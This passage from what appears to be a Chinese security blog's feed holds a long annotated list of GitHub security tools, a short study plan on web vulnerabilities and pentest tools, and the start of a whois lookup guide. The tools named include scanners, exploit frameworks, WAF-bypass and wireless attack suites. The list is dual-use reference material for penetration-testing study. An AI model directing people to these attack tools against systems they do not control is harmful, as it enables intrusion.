href="https://github.com/ysrc/xunfeng">https://github.com/ysrc/xunfeng</a><br>(网络资产识别引擎，漏洞检测引擎)<br><a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a><br>(企业被搜索引擎收录敏感资产信息监控脚本：员工邮箱，子域名，主持人)<br><a href="https://github.com/x0day/Multisearch-v2">https://github.com/x0day/Multisearch-v2</a><br>(Bing，google，360，zoomeye 等搜索引擎聚合搜索，可用于发现企业被搜索引擎收录的敏感资产信息)<br><a href="https://github.com/Ekultek/Zeus-Scanner">https://github.com/Ekultek/Zeus-Scanner</a><br>(能成抓取搜索引擎隐藏的url，并交由sqlmap，nmap扫描)<br><a href="https://github.com/0xbug/Biu-framework">https://github.com/0xbug/Biu-framework</a><br>(企业内网基础服务安全扫描框架)<br><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a><br>(github Repo信息搜集工具)<br><a href="https://github.com/shengqi158/svnhack">https://github.com/shengqi158/svnhack</a><br>(.svn文件夹泄漏利用工具)<br><a href="https://github.com/repoog/GitPrey">https://github.com/repoog/GitPrey</a><br>(GitHub敏感信息扫描工具)<br><a href="https://github.com/0xbug/Hawkeye">https://github.com/0xbug/Hawkeye</a><br>(企业资产，敏感信息GitHub泄露监控系统)<br><a href="https://github.com/lianfeng30/githubscan">https://github.com/lianfeng30/githubscan</a><br>(根据企业关键词进行项目检索以及相应敏感文件和文件内容扫描的工具)<br><a href="https://github.com/UnkL4b/GitMiner">https://github.com/UnkL4b/GitMiner</a><br>(github敏感信息搜索工具)<br><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a><br>( .git文件夹泄漏利用工具)<br><a href="https://github.com/dxa4481/truffleHog">https://github.com/dxa4481/truffleHog</a><br>(GitHub敏感信息扫描工具，包括检测提交等)<br><a href="https://github.com/1N3/Goohak">https://github.com/1N3/Goohak</a><br>(自动化对指定域名进行Google hacking搜索并收集信息)<br><a href="https://github.com/UKHomeOffice/repo-security-scanner">https://github.com/UKHomeOffice/repo-security-scanner</a><br>(用于搜索git的承诺中的敏感信息，例如密码，私钥等的客户端工具)<br><a href="https://github.com/FeeiCN/GSIL">https://github.com/FeeiCN/GSIL</a><br>(Github敏感信息泄露扫描)<br><a href="https://github.com/MiSecurity/x-patrol">https://github.com/MiSecurity/x-patrol</a><br>(Github泄露巡航工具)<br><a href="https://github.com/1N3/BlackWidow">https://github.com/1N3/BlackWidow</a><br>(Web站点信息搜集工具，包括邮箱，电话等信息)<br><a href="https://github.com/anshumanbh/git-all-secrets">https://github.com/anshumanbh/git-all-secrets</a><br>(集合多个开源GitHub敏感信息扫描的企业信息泄露巡航工具)<br><a href="https://github.com/s0md3v/Photon">https://github.com/s0md3v/Photon</a><br>(可以提取网址，电子邮件，文件，网站帐户等的高速爬虫)<br><a href="https://github.com/he1m4n6a/findWebshell">https://github.com/he1m4n6a/findWebshell</a><br>(一款简单的webshell检测工具)<br><a href="https://github.com/Tencent/HaboMalHunter">https://github.com/Tencent/HaboMalHunter</a><br>(哈勃分析系统，LINUX系统病毒分析及安全检测)<br><a href="https://github.com/PlagueScanner/PlagueScanner">https://github.com/PlagueScanner/PlagueScanner</a><br>(使用python实现的集成ClamAV，ESET，Bitdefender的反病毒引擎)<br><a href="https://github.com/nbs-system/php-malware-finder">https://github.com/nbs-system/php-malware-finder</a><br>(一款高效率PHP-webshell扫描工具)<br><a href="https://github.com/emposha/PHP-Shell-Detector/">https://github.com/emposha/PHP-Shell-Detector/</a><br>(测试效率高达99%的webshell检测工具)<br><a href="https://github.com/erevus-cn/scan_webshell">https://github.com/erevus-cn/scan_webshell</a><br>(一款简洁的的Webshell扫描工具)<br><a href="https://github.com/emposha/Shell-Detector">https://github.com/emposha/Shell-Detector</a><br>(Webshell扫描工具，支持php / perl / asp / aspx webshell扫描)<br><a href="https://github.com/m4rco-/dorothy2">https://github.com/m4rco-/dorothy2</a><br>(一款木马，僵尸网络分析框架)<br><a href="https://github.com/droidefense/engine">https://github.com/droidefense/engine</a><br>(高级安卓木马病毒分析框架)<br><a href="https://github.com/lcatro/network_backdoor_scanner">https://github.com/lcatro/network_backdoor_scanner</a><br>(基于网络流量的内网探测框架)<br><a href="https://github.com/fdiskyou/hunter">https://github.com/fdiskyou/hunter</a><br>(调用Windows API枚举用户登录信息)<br><a href="https://github.com/BlackHole1/WebRtcXSS">https://github.com/BlackHole1/WebRtcXSS</a><br>(自动化利用XSS入侵内网)<br><a href="https://github.com/ring04h/wyportmap">https://github.com/ring04h/wyportmap</a><br>(目标端口扫描+系统服务指纹识别)<br><a href="https://github.com/ring04h/weakfilescan">https://github.com/ring04h/weakfilescan</a><br>(动态多线程敏感信息泄露检测工具)<br><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>(WAF产品指纹识别)<br><a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a><br>(SSL类型识别)<br><a href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a><br>(Web指纹识别)<br><a href="https://github.com/tanjiti/FingerPrint">https://github.com/tanjiti/FingerPrint</a><br>(Web应用指纹识别)<br><a href="https://github.com/nanshihui/Scan-T">https://github.com/nanshihui/Scan-T</a><br>(网络爬虫式指纹识别)<br><a href="https://github.com/OffensivePython/Nscan">https://github.com/OffensivePython/Nscan</a><br>(基于Masscan和Zmap的网络扫描器)<br><a href="https://github.com/ywolf/F-NAScan">https://github.com/ywolf/F-NAScan</a><br>(网络资产信息扫描，ICMP存活探测，端口扫描，端口指纹服务识别)<br><a href="https://github.com/ywolf/F-MiddlewareScan">https://github.com/ywolf/F-MiddlewareScan</a><br>(中间件扫描)<br><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br>(web路径收集与扫描)<br><a href="https://github.com/x0day/bannerscan">https://github.com/x0day/bannerscan</a><br>(C段横幅与路径扫描)<br><a href="https://github.com/RASSec/RASscan">https://github.com/RASSec/RASscan</a><br>(端口服务扫描)<br><a href="https://github.com/3xp10it/bypass_waf">https://github.com/3xp10it/bypass_waf</a><br>(waf自动暴破)<br><a href="https://github.com/3xp10it/xcdn">https://github.com/3xp10it/xcdn</a><br>(尝试找出cdn背后的真实ip)<br><a href="https://github.com/Xyntax/BingC">https://github.com/Xyntax/BingC</a><br>(基于Bing搜索引擎的C段/旁站查询，多线程，支持API)<br><a href="https://github.com/Xyntax/DirBrute">https://github.com/Xyntax/DirBrute</a><br>(多线程WEB目录爆破工具)<br><a href="https://github.com/zer0h/httpscan">https://github.com/zer0h/httpscan</a><br>(一个爬虫式的网段Web主机发现小工具)<br><a href="https://github.com/lietdai/doom">https://github.com/lietdai/doom</a><br>(Thorn上实现的分布式任务分发的ip端口漏洞扫描器)<br><a href="https://github.com/chichou/grab.js">https://github.com/chichou/grab.js</a><br>(类似zgrab的快速TCP指纹抓取解析工具，支持更多协议)<br><a href="https://github.com/Nitr4x/whichCDN">https://github.com/Nitr4x/whichCDN</a><br>(CDN识别，检测)<br><a href="https://github.com/secfree/bcrpscan">https://github.com/secfree/bcrpscan</a><br>(基于爬虫的web路径扫描器)<br><a href="https://github.com/mozilla/ssh_scan">https://github.com/mozilla/ssh_scan</a><br>(服务器ssh配置信息扫描)<br><a href="https://github.com/18F/domain-scan">https://github.com/18F/domain-scan</a><br>(针对域名及其子域名的资产数据检测/扫描，包括http / https检测等)<br><a href="https://github.com/ggusoft/inforfinder">https://github.com/ggusoft/inforfinder</a><br>(域名资产收集及指纹识别工具)<br><a href="https://github.com/boy-hack/gwhatweb">https://github.com/boy-hack/gwhatweb</a><br>(CMS识别python gevent实现)<br><a href="https://github.com/Mosuan/FileScan">https://github.com/Mosuan/FileScan</a><br>(敏感文件扫描/二次判断降低误报率/扫描内容规则化/多目录扫描)<br><a href="https://github.com/Xyntax/FileSensor">https://github.com/Xyntax/FileSensor</a><br>(基于爬虫的动态敏感文件探测工具)<br><a href="https://github.com/deibit/cansina">https://github.com/deibit/cansina</a><br>(web路径扫描工具)<br><a href="https://github.com/0xbug/Howl">https://github.com/0xbug/Howl</a><br>(网络设备web服务指纹扫描与检索)<br><a href="https://github.com/mozilla/cipherscan">https://github.com/mozilla/cipherscan</a><br>(目标主机服务ssl类型识别)<br><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a><br>(Web应用fuzz工具，框架，同时可用于web路径/服务扫描)<br><a href="https://github.com/s0md3v/Breacher">https://github.com/s0md3v/Breacher</a><br>(多线程的后台路径扫描器，也可用于发现重定向漏洞后执行)<br><a href="https://github.com/ztgrace/changeme">https://github.com/ztgrace/changeme</a><br>(弱口令扫描器，不仅支持普通登录页，也支持ssh，mongodb等组件)<br><a href="https://github.com/medbenali/CyberScan">https://github.com/medbenali/CyberScan</a><br>(渗透测试辅助工具，支持分析数据包，解码，端口扫描，IP地址分析等)<br><a href="https://github.com/m0nad/HellRaiser">https://github.com/m0nad/HellRaiser</a><br>(基于nmap的扫描器，与cve漏洞关联)<br><a href="https://github.com/scipag/vulscan">https://github.com/scipag/vulscan</a><br>(基于nmap的高级漏洞扫描器，命令行环境使用)<br><a href="https://github.com/jekyc/wig">https://github.com/jekyc/wig</a><br>(web应用信息搜集工具)<br><a href="https://github.com/eldraco/domain_analyzer">https://github.com/eldraco/domain_analyzer</a><br>(围绕web服务的域名进行信息收集和“域传送”等漏洞扫描，也支持针对背后的服务器端口扫描等)<br><a href="https://github.com/cloudtracer/paskto">https://github.com/cloudtracer/paskto</a><br>(基于Nikto扫描规则的被动式路径扫描以及信息爬虫)<br><a href="https://github.com/zerokeeper/WebEye">https://github.com/zerokeeper/WebEye</a><br>(快速识别WEB服务器类型，CMS类型，WAF类型，WHOIS信息，以及语言框架)<br><a href="https://github.com/m3liot/shcheck">https://github.com/m3liot/shcheck</a><br>(用于检查web服务的http header的安全性)<br><a href="https://github.com/aipengjie/sensitivefilescan">https://github.com/aipengjie/sensitivefilescan</a><br>(一款高效快捷的敏感文件扫描工具)<br><a href="https://github.com/fnk0c/cangibrina">https://github.com/fnk0c/cangibrina</a><br>(通过字典穷举，google，robots.txt等途径的跨平台后台管理路径扫描器)<br><a href="https://github.com/n4xh4ck5/CMSsc4n">https://github.com/n4xh4ck5/CMSsc4n</a><br>(常规CMS指纹识别)<br><a href="https://github.com/Ekultek/WhatWaf">https://github.com/Ekultek/WhatWaf</a><br>(WAF指纹识别及自动化绕过工具)<br><a href="https://github.com/dzonerzy/goWAPT">https://github.com/dzonerzy/goWAPT</a><br>(网络应用模糊工具，框架，同时可用于网络路径/服务扫描)<br><a href="https://github.com/blackye/webdirdig">https://github.com/blackye/webdirdig</a><br>(web敏感目录/信息泄漏扫描脚本)<br><a href="https://github.com/GitHackTools/BillCipher">https://github.com/GitHackTools/BillCipher</a><br>(用于网站或IP地址的信息收集工具)<br><a href="https://github.com/boy-hack/w8fuckcdn">https://github.com/boy-hack/w8fuckcdn</a><br>(通过扫描全网获得真实IP的自动化程序)<br><a href="https://github.com/boy-hack/w11scan">https://github.com/boy-hack/w11scan</a><br>(分布式WEB指纹识别平台)<br><a href="https://github.com/Nekmo/dirhunt">https://github.com/Nekmo/dirhunt</a><br>(爬虫式web目录扫描工具)<br><a href="https://github.com/blackye/Jenkins">https://github.com/blackye/Jenkins</a><br>(Jenkins漏洞探测，用户抓取爆破)<br><a href="https://github.com/code-scan/dzscan">https://github.com/code-scan/dzscan</a><br>(首款集成化的Discuz扫描工具)<br><a href="https://github.com/chuhades/CMS-Exploit-Framework">https://github.com/chuhades/CMS-Exploit-Framework</a><br>(一款简洁优雅的CMS扫描利用框架)<br><a href="https://github.com/lijiejie/IIS_shortname_Scanner">https://github.com/lijiejie/IIS_shortname_Scanner</a><br>(IIS短文件名暴力枚举漏洞利用工具)<br><a href="https://github.com/riusksk/FlashScanner">https://github.com/riusksk/FlashScanner</a><br>(flashxss扫描)<br><a href="https://github.com/coffeehb/SSTIF">https://github.com/coffeehb/SSTIF</a><br>(一个起毛服务器端模板注入漏洞的半自动化工具)<br><a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a><br>(服务器端模板注入漏洞检测与利用工具)<br><a href="https://github.com/cr0hn/dockerscan(Docker%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7)">https://github.com/cr0hn/dockerscan(Docker扫描工具)</a><br><a href="https://github.com/m4ll0k/WPSeku">https://github.com/m4ll0k/WPSeku</a><br>(一款精简的wordpress扫描工具)<br><a href="https://github.com/rastating/wordpress-exploit-framework">https://github.com/rastating/wordpress-exploit-framework</a> (集成化wordpress漏洞利用框架)<br><a href="https://github.com/ilmila/J2EEScan">https://github.com/ilmila/J2EEScan</a><br>(用于扫描J2EE应用的一款burpsuite插件)<br><a href="https://github.com/riusksk/StrutScan">https://github.com/riusksk/StrutScan</a><br>(一款基于perl的strut2的历史漏洞扫描器)<br><a href="https://github.com/D35m0nd142/LFISuite">https://github.com/D35m0nd142/LFISuite</a><br>(本地文件包含漏洞利用及扫描工具，支持反弹shell)<br><a href="https://github.com/0x4D31/salt-scanner">https://github.com/0x4D31/salt-scanner</a><br>(基于Salt Open以及Vulners Linux Audit API的linux漏洞扫描器，支持与JIRA，slack平台结合使用)<br><a href="https://github.com/tijme/angularjs-csti-scanner">https://github.com/tijme/angularjs-csti-scanner</a><br>(自动化探测客户端AngularJS模板注入漏洞工具)<br><a href="https://github.com/irsdl/IIS-ShortName-Scanner">https://github.com/irsdl/IIS-ShortName-Scanner</a><br>(Java编写的IIS短文件名暴力枚举漏洞利用工具)<br><a href="https://github.com/swisskyrepo/Wordpresscan">https://github.com/swisskyrepo/Wordpresscan</a><br>(基于WPScan以及WPSeku的优化版wordpress扫描器)<br><a href="https://github.com/CHYbeta/cmsPoc">https://github.com/CHYbeta/cmsPoc</a><br>(CMS渗透测试框架)<br><a href="https://github.com/rudSarkar/crlf-injector">https://github.com/rudSarkar/crlf-injector</a><br>(CRLF注入漏洞批量扫描)<br><a href="https://github.com/3gstudent/Smbtouch-Scanner">https://github.com/3gstudent/Smbtouch-Scanner</a><br>(自动化扫描内网中存在的由影子经纪人泄露的ETERNAL系列漏洞)<br><a href="https://github.com/utiso/dorkbot">https://github.com/utiso/dorkbot</a><br>(通过定制化的谷歌搜索引擎进行漏洞页面搜寻及扫描)<br><a href="https://github.com/OsandaMalith/LFiFreak">https://github.com/OsandaMalith/LFiFreak</a><br>(本地文件包含漏洞利用及扫描工具，支持反弹shell)<br><a href="https://github.com/mak-/parameth">https://github.com/mak-/parameth</a><br>(用于枚举脚本的GET / POST未知参数字段)<br><a href="https://github.com/Lucifer1993/struts-scan">https://github.com/Lucifer1993/struts-scan</a><br>(struts2的漏洞全版本检测和利用工具)<br><a href="https://github.com/hahwul/a2sv">https://github.com/hahwul/a2sv</a><br>(SSL漏洞扫描，例如心脏滴血漏洞等)<br><a href="https://github.com/NullArray/DorkNet">https://github.com/NullArray/DorkNet</a><br>(基于搜索引擎的漏洞网页搜寻)<br><a href="https://github.com/NickstaDB/BaRMIe">https://github.com/NickstaDB/BaRMIe</a><br>(用于攻击爆破Java RemoteMethod Invocation服务的工具)<br><a href="https://github.com/RetireJS/grunt-retire">https://github.com/RetireJS/grunt-retire</a><br>(扫描js扩展库的常见漏洞)<br><a href="https://github.com/kotobukki/BDA">https://github.com/kotobukki/BDA</a><br>(针对的hadoop /火花等大数据平台的的漏洞探测工具)<br><a href="https://github.com/jagracey/Regex-DoS">https://github.com/jagracey/Regex-DoS</a><br>(RegEx拒绝服务扫描器)<br><a href="https://github.com/milesrichardson/docker-onion-nmap">https://github.com/milesrichardson/docker-onion-nmap</a><br>(使用NMAP扫描的Tor网络上隐藏的“洋葱”服务)<br><a href="https://github.com/Moham3dRiahi/XAttacker">https://github.com/Moham3dRiahi/XAttacker</a><br>(Web CMS Exploit工具，包含针对主流CMS的66个不同的漏洞利用)<br><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a><br>(一个迷你的信息泄漏批量扫描脚本)<br><a href="https://github.com/almandin/fuxploider">https://github.com/almandin/fuxploider</a><br>(文件上传漏洞扫描器及利用工具)<br><a href="https://github.com/Ice3man543/SubOver">https://github.com/Ice3man543/SubOver</a><br>(子域名接管漏洞检测工具，支持30+云服务托管检测)<br><a href="https://github.com/Jamalc0m/wphunter">https://github.com/Jamalc0m/wphunter</a><br>(WordPress的漏洞扫描器，同时也支持敏感文件泄露扫描)<br><a href="https://github.com/retirejs/retire.js">https://github.com/retirejs/retire.js</a><br>(检测网站依赖的JavaScript库中存在的已知通用漏洞)<br><a href="https://github.com/3xp10it/xupload">https://github.com/3xp10it/xupload</a><br>(自动检测上传功能是否可上传webshell)<br><a href="https://github.com/mobrine-mob/M0B-tool">https://github.com/mobrine-mob/M0B-tool</a><br>(CMS指纹识别及自动化渗透测试框架)<br><a href="https://github.com/rezasp/vbscan">https://github.com/rezasp/vbscan</a><br>(论坛框架vBulletin黑盒漏洞扫描器)<br><a href="https://github.com/MrSqar-Ye/BadMod">https://github.com/MrSqar-Ye/BadMod</a><br>(CMS指纹识别及自动化渗透测试框架)<br><a href="https://github.com/Tuhinshubhra/CMSeeK">https://github.com/Tuhinshubhra/CMSeeK</a><br>(CMS漏洞检测和利用套件)<br><a href="https://github.com/cloudsploit/scans">https://github.com/cloudsploit/scans</a><br>(AWS安全审计工具)<br><a href="https://github.com/radenvodka/SVScanner">https://github.com/radenvodka/SVScanner</a><br>(针对wp，magento，joomla等CMS的漏洞扫描器及自动利用工具)<br><a href="https://github.com/rezasp/joomscan">https://github.com/rezasp/joomscan</a><br>(OWASP旗下joomla漏洞扫描项目)<br><a href="https://github.com/6IX7ine/djangohunter">https://github.com/6IX7ine/djangohunter</a><br>(用于检测因错误配置导致敏感信息暴露的Django应用程序)<br><a href="https://github.com/savio-code/fern-wifi-cracker/">https://github.com/savio-code/fern-wifi-cracker/</a><br>(无线安全审计工具)<br><a href="https://github.com/m4n3dw0lf/PytheM">https://github.com/m4n3dw0lf/PytheM</a><br>(Python网络/渗透测试工具)<br><a href="https://github.com/P0cL4bs/WiFi-Pumpkin">https://github.com/P0cL4bs/WiFi-Pumpkin</a><br>(无线安全渗透测试套件)<br><a href="https://github.com/MisterBianco/BoopSuite">https://github.com/MisterBianco/BoopSuite</a><br>(无线网络审计工具，支持2-5GHZ频段)<br><a href="https://github.com/DanMcInerney/LANs.py">https://github.com/DanMcInerney/LANs.py</a><br>(ARP欺骗，无线网络劫持)<br><a href="https://github.com/besimaltnok/PiFinger">https://github.com/besimaltnok/PiFinger</a><br>(检查wifi是否是“大菠萝”所开放的热点，并给予网络评分)<br><a href="https://github.com/derv82/wifite2">https://github.com/derv82/wifite2</a><br>(自动化无线网络攻击工具wifite的重构版本)<br><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a><br>(基于BBScan via.lijiejie的本地网络扫描)<br><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a><br>(基于JavaScript的的本地网络扫描)<br><a href="https://github.com/wufeifei/cobra">https://github.com/wufeifei/cobra</a><br>(白盒代码安全审计系统)<br><a href="https://github.com/OneSourceCat/phpvulhunter">https://github.com/OneSourceCat/phpvulhunter</a><br>(静态PHP代码审计)<br><a href="https://github.com/Qihoo360/phptrace">https://github.com/Qihoo360/phptrace</a><br>(跟踪，分析PHP运行情况的工具)<br><a href="https://github.com/ajinabraham/NodeJsScan">https://github.com/ajinabraham/NodeJsScan</a><br>(的NodeJS应用代码审计)<br><a href="https://github.com/shengqi158/pyvulhunter">https://github.com/shengqi158/pyvulhunter</a><br>(Python应用审计)<br><a href="https://github.com/presidentbeef/brakeman">https://github.com/presidentbeef/brakeman</a><br>(Ruby on Rails应用静态代码分析)<br><a href="https://github.com/python-security/pyt">https://github.com/python-security/pyt</a><br>(Python应用静态代码审计)<br><a href="https://github.com/m4ll0k/WPSploit">https://github.com/m4ll0k/WPSploit</a><br>(WordPress插件代码安全审计)<br><a href="https://github.com/emanuil/php-reaper">https://github.com/emanuil/php-reaper</a><br>(用于扫描PHP应用程序中可能存在SQL漏洞的ADOdb代码)<br><a href="https://github.com/lowjoel/phortress">https://github.com/lowjoel/phortress</a><br>(用于检测潜在安全漏洞的PHP静态代码分析工具)<br><a href="https://github.com/az0ne/AZScanner">https://github.com/az0ne/AZScanner</a><br>(自动漏洞扫描器，子域名爆破，端口扫描，目录爆破，常用框架漏洞检测)<br><a href="https://github.com/blackye/lalascan">https://github.com/blackye/lalascan</a><br>(集合owasp top10漏洞扫描和边界资产发现能力的分布式web漏洞扫描框架)<br><a href="https://github.com/blackye/BkScanner">https://github.com/blackye/BkScanner</a><br>(BkScanner分布式，插件化web漏洞扫描器)<br><a href="https://github.com/ysrc/GourdScanV2">https://github.com/ysrc/GourdScanV2</a><br>(ysrc出品的被动式漏洞扫描工具)<br><a href="https://github.com/netxfly/passive_scan">https://github.com/netxfly/passive_scan</a><br>(基于http代理的web漏洞扫描器)<br><a href="https://github.com/1N3/Sn1per">https://github.com/1N3/Sn1per</a><br>(自动化扫描器，包括中间件扫描以及设备指纹识别)<br><a href="https://github.com/RASSec/pentestEr_Fully-automatic-scanner">https://github.com/RASSec/pentestEr_Fully-automatic-scanner</a><br>(定向全自动化渗透测试工具)<br><a href="https://github.com/3xp10it/3xp10it">https://github.com/3xp10it/3xp10it</a><br>(自动化渗透测试框架，支持cdn真实ip查找，指纹识别等)<br><a href="https://github.com/Lcys/lcyscan">https://github.com/Lcys/lcyscan</a><br>(蟒插件化漏洞扫描器，支持生成扫描报表)<br><a href="https://github.com/Xyntax/POC-T">https://github.com/Xyntax/POC-T</a><br>(渗透测试插件化并发框架)<br><a href="https://github.com/v3n0m-Scanner/V3n0M-Scanner">https://github.com/v3n0m-Scanner/V3n0M-Scanner</a><br>(支持检测SQLI/ XSS / LFI / RFI等漏洞的扫描器)<br><a href="https://github.com/Skycrab/leakScan">https://github.com/Skycrab/leakScan</a><br>(Web图形化的漏洞扫描框架)<br><a href="https://github.com/zhangzhenfeng/AnyScan">https://github.com/zhangzhenfeng/AnyScan</a><br>(一款网络化的自动化渗透测试框架)<br><a href="https://github.com/Tuhinshubhra/RED_HAWK">https://github.com/Tuhinshubhra/RED_HAWK</a><br>(一款集成信息收集，漏洞扫描，指纹识别等的多合一扫描工具)<br><a href="https://github.com/Arachni/arachni">https://github.com/Arachni/arachni</a><br>(高度集成化的Web应用漏洞扫描框架，支持REST，RPC等api调用)<br><a href="https://github.com/infobyte/faraday">https://github.com/infobyte/faraday</a><br>(集成化渗透测试辅助平台及漏洞管理平台)<br><a href="https://github.com/juansacco/exploitpack">https://github.com/juansacco/exploitpack</a><br>(渗透测试集成框架，包含超过38,000+攻击)<br><a href="https://github.com/swisskyrepo/DamnWebScanner">https://github.com/swisskyrepo/DamnWebScanner</a><br>(基于铬/歌剧插件的被动式漏洞扫描)<br><a href="https://github.com/anilbaranyelken/tulpar">https://github.com/anilbaranyelken/tulpar</a><br>(支持多种网络漏洞扫描，命令行环境使用)<br><a href="https://github.com/m4ll0k/Spaghetti">https://github.com/m4ll0k/Spaghetti</a><br>(web应用扫描器，支持指纹识别，文件目录爆破，SQL / XSS / RFI等漏洞扫描，也可直接用于struts，ShellShock等扫描)<br><a href="https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest">https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest</a><br>(集成子域名枚举，nmap，waf指纹识别等模块的web应用扫描器)<br><a href="https://github.com/0xsauby/yasuo">https://github.com/0xsauby/yasuo</a><br>(使用ruby开发的扫描网络中主机存在的第三方web应用服务漏洞)<br><a href="https://github.com/hatRiot/clusterd">https://github.com/hatRiot/clusterd</a><br>(Web应用自动化扫描框架，支持自动化上传webshell)<br><a href="https://github.com/erevus-cn/pocscan">https://github.com/erevus-cn/pocscan</a><br>(一款开源Poc调用框架，可轻松调用Pocsuite，Tangscan，Beebeeto，Knowsec老版本POC，可使用docker部署)<br><a href="https://github.com/TophantTechnology/osprey">https://github.com/TophantTechnology/osprey</a><br>(斗象能力中心出品并长期维护的开源漏洞检测框架)<br><a href="https://github.com/yangbh/Hammer">https://github.com/yangbh/Hammer</a><br>(Web应用漏洞扫描框架)<br><a href="https://github.com/Lucifer1993/AngelSword">https://github.com/Lucifer1993/AngelSword</a><br>(Web应用漏洞扫描框架，基于python3)<br><a href="https://github.com/secrary/EllaScanner">https://github.com/secrary/EllaScanner</a><br>(被动式漏洞扫描，支持历史cve编号漏洞识别)<br><a href="https://github.com/zaproxy/zaproxy">https://github.com/zaproxy/zaproxy</a><br>(OWASP ZAP核心项目出品的综合性渗透测试工具)<br><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a><br>(Web服务综合型扫描器，用于指定目标的资产收集，安全配置缺陷或者安全漏洞扫描)<br><a href="https://github.com/s0md3v/Striker">https://github.com/s0md3v/Striker</a><br>(一款多方位信息收集，指纹识别及漏洞扫描工具)<br><a href="https://github.com/dermotblair/webvulscan">https://github.com/dermotblair/webvulscan</a><br>(一款web应用漏洞扫描器，支持扫描反射型以及存储型xss，sql injection等漏洞，支持输出pdf报告)<br><a href="https://github.com/alienwithin/OWASP-mth3l3m3nt-framework">https://github.com/alienwithin/OWASP-mth3l3m3nt-framework</a><br>(渗透测试辅助工具，综合利用框架)<br><a href="https://github.com/toyakula/luna">https://github.com/toyakula/luna</a><br>(基于被动式扫描框架的自动化web漏洞扫描工具)<br><a href="https://github.com/Manisso/fsociety">https://github.com/Manisso/fsociety</a><br>(渗透测试辅助框架，包含信息搜集，无线渗透，网络应用扫描等功能)<br><a href="https://github.com/boy-hack/w9scan">https://github.com/boy-hack/w9scan</a><br>(内置1200+插件的web漏洞扫描框架)<br><a href="https://github.com/YalcinYolalan/WSSAT">https://github.com/YalcinYolalan/WSSAT</a><br>(Web服务安全评估工具，提供基于windows操作系统的简单.exe应用)<br><a href="https://github.com/AmyangXYZ/AssassinGo">https://github.com/AmyangXYZ/AssassinGo</a><br>(使用去开发的可扩展以及高并发渗透测试框架)<br><a href="https://github.com/jeffzh3ng/InsectsAwake">https://github.com/jeffzh3ng/InsectsAwake</a><br>(基于Flask应用框架的漏洞扫描系统)<br><a href="https://github.com/m4ll0k/Galileo">https://github.com/m4ll0k/Galileo</a><br>(一个操作上类似metasploit的web应用安全审计框架)<br><a href="https://github.com/joker25000/Optiva-Framework">https://github.com/joker25000/Optiva-Framework</a><br>(一款web应用漏洞扫描器，支持扫描反射型以及存储型xss，sql injection等漏洞)<br><a href="https://github.com/theInfectedDrake/TIDoS-Framework">https://github.com/theInfectedDrake/TIDoS-Framework</a><br>(集成104个模块的Web应用程序渗透测试框架)<br><a href="https://github.com/Neo23x0/Loki">https://github.com/Neo23x0/Loki</a><br>(一款APT入侵痕迹扫描器)<br><a href="https://github.com/w3h/icsmaster/tree/master/nse">https://github.com/w3h/icsmaster/tree/master/nse</a><br>(ICS设备nmap扫描脚本)<br><a href="https://github.com/OpenNetworkingFoundation/DELTA">https://github.com/OpenNetworkingFoundation/DELTA</a><br>(SDN安全评估框架)</p>
]]></content>
      <categories>
        <category>工具手册</category>
      </categories>
      <tags>
        <tag>工具手册</tag>
      </tags>
  </entry>
  <entry>
    <title>个人规划</title>
    <url>/posts/d7c4f825/</url>
    <content><![CDATA[<p>最近一直在考研和就业上有所犹豫，这两天回家呆了几天，仔细想了想，最终还是决定选择就业，不去考研了。在这半年中，要好好准备，等暑假或者开学后去外面实习。在这期间，要好好学习以下一些知识。之前hvv面试了四次，面试前也没再接触这些兑现，再学习高数英语啥的，现在做好决定了，那就认真准备吧~</p>
<p>博客也会即使更新，希望每天都可以学到写东西吧。</p>
<br>

<ul>
<li>基础漏洞原理及利用</li>
</ul>
<ol>
<li>xss</li>
<li>sql注入</li>
<li>ssrf</li>
<li>csrf</li>
<li>XXE</li>
<li>反序列化</li>
<li>文件上传</li>
<li>逻辑漏洞</li>
<li>… （有待补充）</li>
</ol>
<ul>
<li>工具使用</li>
</ul>
<ol>
<li>burp suite 及插件</li>
<li>sqlmap</li>
<li>nmap</li>
<li>msf</li>
<li>xray</li>
<li>fuzzscan</li>
<li>Goby </li>
<li>…. （有待补充）</li>
</ol>
<ul>
<li>脚本编写</li>
</ul>
<ol>
<li>批量payload</li>
<li>scan</li>
</ol>
<ul>
<li>漏洞复现</li>
</ul>
<ol>
<li>vulhub</li>
<li>dwva</li>
<li>sqli</li>
<li>zkaq</li>
<li>…   (有待补充)</li>
</ol>
<ul>
<li>网络协议</li>
</ul>
<ol>
<li>TCP/IP</li>
<li>UDP</li>
<li>三次握手</li>
<li>…   （有待补充）</li>
</ol>
<ul>
<li>内网安全</li>
<li>APP渗透</li>
</ul>
]]></content>
      <categories>
        <category>规划</category>
      </categories>
      <tags>
        <tag>规划</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集</title>
    <url>/posts/312e3d12/</url>
    <content><![CDATA[<h2 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h2><h3 id="web接口查询"><a href="#web接口查询" class="headerlink" title="web接口查询:"></a>web接口查询:</h3><p><code>https://whois.aliyun.com/</code><br><code>https://www.whois365.com/cn/</code><br><code>http://whois.chinaz.com/</code><br><code>https://whois.aizhan.com/</code></p>
<h3 id="whois命令查询"><a href="#whois命令查询" class="headerlink" title="whois命令查询"></a>whois命令查询</h3><p>kali中自带whois查询工具  <code>whois 域名</code>进行查询</p>
